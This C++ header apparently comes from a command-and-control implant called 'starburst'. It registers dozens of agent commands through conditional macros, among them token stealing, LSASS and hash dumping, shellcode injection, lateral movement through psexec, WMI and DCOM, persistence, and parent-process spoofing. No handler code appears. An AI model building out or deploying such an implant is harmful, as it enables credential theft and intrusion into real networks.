#ifndef STARBURST_COMMAND_TABLE_H
#define STARBURST_COMMAND_TABLE_H

#include <config.h>
#include <commands.h>
#include <module.h>

/*
 * Static command registration table.
 *
 * To add a new command:
 *   1. Define CMD_<NAME> id in config.h
 *   2. Create src/commands/cmd_<name>.cc (guard with #ifdef INCLUDE_CMD_<NAME>)
 *   3. Add handler declaration to commands.h
 *   4. Add CMD_REG_<NAME> entry below
 *   5. Add CMD_REG_<NAME> to COMMAND_TABLE_ENTRIES
 */

namespace starburst {

#ifdef INCLUDE_CMD_EXIT
  #define CMD_REG_EXIT    { CMD_EXIT, cmd_exit },
#else
  #define CMD_REG_EXIT
#endif

#ifdef INCLUDE_CMD_SLEEP
  #define CMD_REG_SLEEP   { CMD_SLEEP, cmd_sleep },
#else
  #define CMD_REG_SLEEP
#endif

#ifdef INCLUDE_CMD_SHELL
  #define CMD_REG_SHELL   { CMD_SHELL, cmd_shell },
#else
  #define CMD_REG_SHELL
#endif

#ifdef INCLUDE_CMD_WHOAMI
  #define CMD_REG_WHOAMI  { CMD_WHOAMI, cmd_whoami },
#else
  #define CMD_REG_WHOAMI
#endif

#ifdef INCLUDE_CMD_PWD
  #define CMD_REG_PWD     { CMD_PWD, cmd_pwd },
#else
  #define CMD_REG_PWD
#endif

#ifdef INCLUDE_CMD_CD
  #define CMD_REG_CD      { CMD_CD, cmd_cd },
#else
  #define CMD_REG_CD
#endif

#ifdef INCLUDE_CMD_LS
  #define CMD_REG_LS      { CMD_LS, cmd_ls },
#else
  #define CMD_REG_LS
#endif

#ifdef INCLUDE_CMD_PS
  #define CMD_REG_PS      { CMD_PS, cmd_ps },
#else
  #define CMD_REG_PS
#endif

#ifdef INCLUDE_CMD_CONFIG
  #define CMD_REG_CONFIG  { CMD_CONFIG, cmd_config },
#else
  #define CMD_REG_CONFIG
#endif

#ifdef INCLUDE_CMD_UPLOAD
  #define CMD_REG_UPLOAD  { CMD_UPLOAD, cmd_upload },
#else
  #define CMD_REG_UPLOAD
#endif

#ifdef INCLUDE_CMD_DOWNLOAD
  #define CMD_REG_DOWNLOAD { CMD_DOWNLOAD, cmd_download },
#else
  #define CMD_REG_DOWNLOAD
#endif

#ifdef INCLUDE_CMD_SHINJECT
  #define CMD_REG_SHINJECT { CMD_SHINJECT, cmd_shinject },
#else
  #define CMD_REG_SHINJECT
#endif

#ifdef INCLUDE_CMD_EXECUTE_PIC
  #define CMD_REG_EXECUTE_PIC { CMD_EXECUTE_PIC, cmd_execute_pic },
#else
  #define CMD_REG_EXECUTE_PIC
#endif

#ifdef INCLUDE_CMD_CAT
  #define CMD_REG_CAT { CMD_CAT, cmd_cat },
#else
  #define CMD_REG_CAT
#endif

#ifdef INCLUDE_CMD_MKDIR
  #define CMD_REG_MKDIR { CMD_MKDIR, cmd_mkdir },
#else
  #define CMD_REG_MKDIR
#endif

#ifdef INCLUDE_CMD_RM
  #define CMD_REG_RM { CMD_RM, cmd_rm },
#else
  #define CMD_REG_RM
#endif

#ifdef INCLUDE_CMD_CP
  #define CMD_REG_CP { CMD_CP, cmd_cp },
#else
  #define CMD_REG_CP
#endif

#ifdef INCLUDE_CMD_MV
  #define CMD_REG_MV { CMD_MV, cmd_mv },
#else
  #define CMD_REG_MV
#endif

#ifdef INCLUDE_CMD_ENV
  #define CMD_REG_ENV { CMD_ENV, cmd_env },
#else
  #define CMD_REG_ENV
#endif

#ifdef INCLUDE_CMD_REG_QUERY
  #define CMD_REG_REG_QUERY { CMD_REG_QUERY, cmd_reg_query },
#else
  #define CMD_REG_REG_QUERY
#endif

#ifdef INCLUDE_CMD_SCREENSHOT
  #define CMD_REG_SCREENSHOT { CMD_SCREENSHOT, cmd_screenshot },
#else
  #define CMD_REG_SCREENSHOT
#endif

#ifdef INCLUDE_CMD_TOKEN_LIST
  #define CMD_REG_TOKEN_LIST { CMD_TOKEN_LIST, cmd_token_list },
#else
  #define CMD_REG_TOKEN_LIST
#endif

#ifdef INCLUDE_CMD_EXECUTE_ASSEMBLY
  #define CMD_REG_EXECUTE_ASSEMBLY { CMD_EXECUTE_ASSEMBLY, cmd_execute_assembly },
#else
  #define CMD_REG_EXECUTE_ASSEMBLY
#endif

#ifdef INCLUDE_CMD_EXECUTE_COFF
  #define CMD_REG_EXECUTE_COFF { CMD_EXECUTE_COFF, cmd_execute_coff },
#else
  #define CMD_REG_EXECUTE_COFF
#endif

#ifdef INCLUDE_CMD_JUMP_PSEXEC
  #define CMD_REG_JUMP_PSEXEC { CMD_JUMP_PSEXEC, cmd_jump_psexec },
#else
  #define CMD_REG_JUMP_PSEXEC
#endif

#ifdef INCLUDE_CMD_JUMP_SCSHELL
  #define CMD_REG_JUMP_SCSHELL { CMD_JUMP_SCSHELL, cmd_jump_scshell },
#else
  #define CMD_REG_JUMP_SCSHELL
#endif

#ifdef INCLUDE_CMD_JUMP_WMIEXEC
  #define CMD_REG_JUMP_WMIEXEC { CMD_JUMP_WMIEXEC, cmd_jump_wmiexec },
#else
  #define CMD_REG_JUMP_WMIEXEC
#endif

#ifdef INCLUDE_CMD_JUMP_DCOMEXEC
  #define CMD_REG_JUMP_DCOMEXEC { CMD_JUMP_DCOMEXEC, cmd_jump_dcomexec },
#else
  #define CMD_REG_JUMP_DCOMEXEC
#endif

#ifdef INCLUDE_CMD_IFCONFIG
  #define CMD_REG_IFCONFIG { CMD_IFCONFIG, cmd_ifconfig },
#else
  #define CMD_REG_IFCONFIG
#endif

#ifdef INCLUDE_CMD_NETSTAT
  #define CMD_REG_NETSTAT { CMD_NETSTAT, cmd_netstat },
#else
  #define CMD_REG_NETSTAT
#endif

#ifdef INCLUDE_CMD_KILL
  #define CMD_REG_KILL { CMD_KILL, cmd_kill },
#else
  #define CMD_REG_KILL
#endif

#ifdef INCLUDE_CMD_RUN
  #define CMD_REG_RUN { CMD_RUN, cmd_run },
#else
  #define CMD_REG_RUN
#endif

#ifdef INCLUDE_CMD_GETPRIVS
  #define CMD_REG_GETPRIVS { CMD_GETPRIVS, cmd_getprivs },
#else
  #define CMD_REG_GETPRIVS
#endif

#ifdef INCLUDE_CMD_LISTPIPES
  #define CMD_REG_LISTPIPES { CMD_LISTPIPES, cmd_listpipes },
#else
  #define CMD_REG_LISTPIPES
#endif

#ifdef INCLUDE_CMD_REG_WRITE_VALUE
  #define CMD_REG_REG_WRITE_VALUE { CMD_REG_WRITE_VALUE, cmd_reg_write_value },
#else
  #define CMD_REG_REG_WRITE_VALUE
#endif

#ifdef INCLUDE_CMD_MAKE_TOKEN
  #define CMD_REG_MAKE_TOKEN { CMD_MAKE_TOKEN, cmd_make_token },
#else
  #define CMD_REG_MAKE_TOKEN
#endif

#ifdef INCLUDE_CMD_STEAL_TOKEN
  #define CMD_REG_STEAL_TOKEN { CMD_STEAL_TOKEN, cmd_steal_token },
#else
  #define CMD_REG_STEAL_TOKEN
#endif

#ifdef INCLUDE_CMD_REV2SELF
  #define CMD_REG_REV2SELF { CMD_REV2SELF, cmd_rev2self },
#else
  #define CMD_REG_REV2SELF
#endif

#ifdef INCLUDE_CMD_NET_LOCALGROUP
  #define CMD_REG_NET_LOCALGROUP { CMD_NET_LOCALGROUP, cmd_net_localgroup },
#else
  #define CMD_REG_NET_LOCALGROUP
#endif

#ifdef INCLUDE_CMD_NET_LOCALGROUP_MEMBER
  #define CMD_REG_NET_LOCALGROUP_MEMBER { CMD_NET_LOCALGROUP_MEMBER, cmd_net_localgroup_member },
#else
  #define CMD_REG_NET_LOCALGROUP_MEMBER
#endif

#ifdef INCLUDE_CMD_POWERPICK
  #define CMD_REG_POWERPICK { CMD_POWERPICK, cmd_powerpick },
#else
  #define CMD_REG_POWERPICK
#endif

#ifdef INCLUDE_CMD_SPAWNTO_X64
  #define CMD_REG_SPAWNTO_X64 { CMD_SPAWNTO_X64, cmd_spawnto_x64 },
#else
  #define CMD_REG_SPAWNTO_X64
#endif

#ifdef INCLUDE_CMD_SPAWNTO_X86
  #define CMD_REG_SPAWNTO_X86 { CMD_SPAWNTO_X86, cmd_spawnto_x86 },
#else
  #define CMD_REG_SPAWNTO_X86
#endif

#ifdef INCLUDE_CMD_SPAWN
  #define CMD_REG_SPAWN { CMD_SPAWN, cmd_spawn },
#else
  #define CMD_REG_SPAWN
#endif

#ifdef INCLUDE_CMD_ARP
  #define CMD_REG_ARP { CMD_ARP, cmd_arp },
#else
  #define CMD_REG_ARP
#endif

#ifdef INCLUDE_CMD_DRIVES
  #define CMD_REG_DRIVES { CMD_DRIVES, cmd_drives },
#else
  #define CMD_REG_DRIVES
#endif

#ifdef INCLUDE_CMD_UPTIME
  #define CMD_REG_UPTIME { CMD_UPTIME, cmd_uptime },
#else
  #define CMD_REG_UPTIME
#endif

#ifdef INCLUDE_CMD_NET_SESSIONS
  #define CMD_REG_NET_SESSIONS { CMD_NET_SESSIONS, cmd_net_sessions },
#else
  #define CMD_REG_NET_SESSIONS
#endif

#ifdef INCLUDE_CMD_NET_SHARES
  #define CMD_REG_NET_SHARES { CMD_NET_SHARES, cmd_net_shares },
#else
  #define CMD_REG_NET_SHARES
#endif

#ifdef INCLUDE_CMD_NET_LOGGEDON
  #define CMD_REG_NET_LOGGEDON { CMD_NET_LOGGEDON, cmd_net_loggedon },
#else
  #define CMD_REG_NET_LOGGEDON
#endif

#ifdef INCLUDE_CMD_CLIPBOARD
  #define CMD_REG_CLIPBOARD { CMD_CLIPBOARD, cmd_clipboard },
#else
  #define CMD_REG_CLIPBOARD
#endif

#ifdef INCLUDE_CMD_WINDOWS
  #define CMD_REG_WINDOWS { CMD_WINDOWS, cmd_windows },
#else
  #define CMD_REG_WINDOWS
#endif

#ifdef INCLUDE_CMD_REG_DELETE
  #define CMD_REG_REG_DELETE { CMD_REG_DELETE, cmd_reg_delete },
#else
  #define CMD_REG_REG_DELETE
#endif

#ifdef INCLUDE_CMD_REG_CREATE_KEY
  #define CMD_REG_REG_CREATE_KEY { CMD_REG_CREATE_KEY, cmd_reg_create_key },
#else
  #define CMD_REG_REG_CREATE_KEY
#endif

#ifdef INCLUDE_CMD_PERSIST_RUN
  #define CMD_REG_PERSIST_RUN { CMD_PERSIST_RUN, cmd_persist_run },
#else
  #define CMD_REG_PERSIST_RUN
#endif

#ifdef INCLUDE_CMD_PERSIST_SCHTASK
  #define CMD_REG_PERSIST_SCHTASK { CMD_PERSIST_SCHTASK, cmd_persist_schtask },
#else
  #define CMD_REG_PERSIST_SCHTASK
#endif

#ifdef INCLUDE_CMD_PERSIST_SERVICE
  #define CMD_REG_PERSIST_SERVICE { CMD_PERSIST_SERVICE, cmd_persist_service },
#else
  #define CMD_REG_PERSIST_SERVICE
#endif

#ifdef INCLUDE_CMD_PPID_SPOOF
  #define CMD_REG_PPID_SPOOF { CMD_PPID_SPOOF, cmd_ppid_spoof },
#else
  #define CMD_REG_PPID_SPOOF
#endif

#ifdef INCLUDE_CMD_ARGUE
  #define CMD_REG_ARGUE { CMD_ARGUE, cmd_argue },
#else
  #define CMD_REG_ARGUE
#endif

#ifdef INCLUDE_CMD_RUNAS
  #define CMD_REG_RUNAS { CMD_RUNAS, cmd_runas },
#else
  #define CMD_REG_RUNAS
#endif

#ifdef INCLUDE_CMD_HASHDUMP
  #define CMD_REG_HASHDUMP { CMD_HASHDUMP, cmd_hashdump },
#else
  #define CMD_REG_HASHDUMP
#endif

#ifdef INCLUDE_CMD_LSASS_DUMP
  #define CMD_REG_LSASS_DUMP { CMD_LSASS_DUMP, cmd_lsass_dump },
#else
  #define CMD_REG_LSASS_DUMP
#endif

#ifdef INCLUDE_CMD_TOKEN_STORE
  #define CMD_REG_TOKEN_STORE { CMD_TOKEN_STORE, cmd_token_store },
#else
  #define CMD_REG_TOKEN_STORE
#endif

#ifdef INCLUDE_CMD_PORTSCAN
  #define CMD_REG_PORTSCAN { CMD_PORTSCAN, cmd_portscan },
#else
  #define CMD_REG_PORTSCAN
#endif

#ifdef INCLUDE_CMD_INLINE_EXECUTE
  #define CMD_REG_INLINE_EXECUTE { CMD_INLINE_EXECUTE, cmd_inline_execute },
#else
  #define CMD_REG_INLINE_EXECUTE
#endif

#ifdef INCLUDE_CMD_LOAD
  #define CMD_REG_LOAD { CMD_LOAD, cmd_load },
#else
  #define CMD_REG_LOAD
#endif

#ifdef INCLUDE_CMD_WMIEXEC
  #define CMD_REG_WMIEXEC { CMD_WMIEXEC, cmd_wmiexec },
#else
  #define CMD_REG_WMIEXEC
#endif

#ifdef INCLUDE_CMD_DCOMEXEC
  #define CMD_REG_DCOMEXEC { CMD_DCOMEXEC, cmd_dcomexec },
#else
  #define CMD_REG_DCOMEXEC
#endif

#define COMMAND_TABLE_ENTRIES \
    CMD_REG_EXIT              \
    CMD_REG_SLEEP             \
    CMD_REG_SHELL             \
    CMD_REG_WHOAMI            \
    CMD_REG_PWD               \
    CMD_REG_CD                \
    CMD_REG_LS                \
    CMD_REG_PS                \
    CMD_REG_CONFIG            \
    CMD_REG_UPLOAD            \
    CMD_REG_DOWNLOAD          \
    CMD_REG_SHINJECT          \
    CMD_REG_EXECUTE_PIC       \
    CMD_REG_CAT               \
    CMD_REG_MKDIR             \
    CMD_REG_RM                \
    CMD_REG_CP                \
    CMD_REG_MV                \
    CMD_REG_ENV               \
    CMD_REG_REG_QUERY         \
    CMD_REG_SCREENSHOT        \
    CMD_REG_TOKEN_LIST        \
    CMD_REG_EXECUTE_ASSEMBLY  \
    CMD_REG_EXECUTE_COFF      \
    CMD_REG_JUMP_PSEXEC       \
    CMD_REG_JUMP_SCSHELL      \
    CMD_REG_JUMP_WMIEXEC      \
    CMD_REG_JUMP_DCOMEXEC     \
    CMD_REG_IFCONFIG          \
    CMD_REG_NETSTAT           \
    CMD_REG_KILL              \
    CMD_REG_RUN               \
    CMD_REG_GETPRIVS          \
    CMD_REG_LISTPIPES         \
    CMD_REG_REG_WRITE_VALUE   \
    CMD_REG_MAKE_TOKEN        \
    CMD_REG_STEAL_TOKEN       \
    CMD_REG_REV2SELF          \
    CMD_REG_NET_LOCALGROUP    \
    CMD_REG_NET_LOCALGROUP_MEMBER \
    CMD_REG_POWERPICK         \
    CMD_REG_SPAWNTO_X64       \
    CMD_REG_SPAWNTO_X86       \
    CMD_REG_SPAWN             \
    CMD_REG_ARP               \
    CMD_REG_DRIVES            \
    CMD_REG_UPTIME            \
    CMD_REG_NET_SESSIONS      \
    CMD_REG_NET_SHARES        \
    CMD_REG_NET_LOGGEDON      \
    CMD_REG_CLIPBOARD         \
    CMD_REG_WINDOWS           \
    CMD_REG_REG_DELETE        \
    CMD_REG_REG_CREATE_KEY    \
    CMD_REG_PERSIST_RUN       \
    CMD_REG_PERSIST_SCHTASK   \
    CMD_REG_PERSIST_SERVICE   \
    CMD_REG_PPID_SPOOF        \
    CMD_REG_ARGUE             \
    CMD_REG_RUNAS             \
    CMD_REG_HASHDUMP          \
    CMD_REG_LSASS_DUMP        \
    CMD_REG_TOKEN_STORE       \
    CMD_REG_PORTSCAN          \
    CMD_REG_INLINE_EXECUTE    \
    CMD_REG_LOAD              \
    CMD_REG_WMIEXEC           \
    CMD_REG_DCOMEXEC

}

#endif
